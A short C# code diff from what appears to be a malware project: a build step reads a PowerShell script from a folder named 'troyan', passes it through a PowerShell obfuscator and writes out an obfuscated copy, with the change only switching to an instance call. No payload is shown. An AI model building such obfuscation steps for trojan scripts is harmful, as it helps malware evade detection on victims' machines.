@@ -5,7 +5,7 @@ class Program
     static void Main(string[] args)
     {
         var data = System.IO.File.ReadAllText(@"C:\soft\hephaestus\troyan\_output\holder.debug.ps1");
-        data = PowerShellObfuscator.Obfuscate(data);
+        data = new PowerShellObfuscator().Obfuscate(data);
         System.IO.File.WriteAllText(@"C:\soft\hephaestus\troyan\_output\holder.ob.ps1", data);
         return;
         
